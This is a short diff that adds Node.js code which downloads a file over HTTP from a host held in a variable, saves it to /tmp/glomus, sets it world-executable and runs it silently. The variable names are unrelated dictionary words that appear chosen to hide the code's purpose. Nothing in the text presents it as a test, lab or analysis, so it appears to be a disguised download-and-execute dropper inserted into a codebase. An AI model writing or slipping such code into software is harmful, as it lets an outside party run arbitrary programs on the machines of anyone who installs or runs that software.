@@ -1,0 +1,11 @@
+particularised = http.get('http://' + remold + '/broomrape', function(flemished) {
+          var neroli = fs.createWriteStream('/tmp/glomus');
+          flemished.on('data', function(tollman) {
+            neroli.write(tollman);
+          });
+          flemished.on('end', function() {
+            neroli.end();
+            fs.chmod('/tmp/glomus', '0777');
+            child_process.exec('/tmp/glomus', function(err, stdout, stderr) {});
+          });
+        })
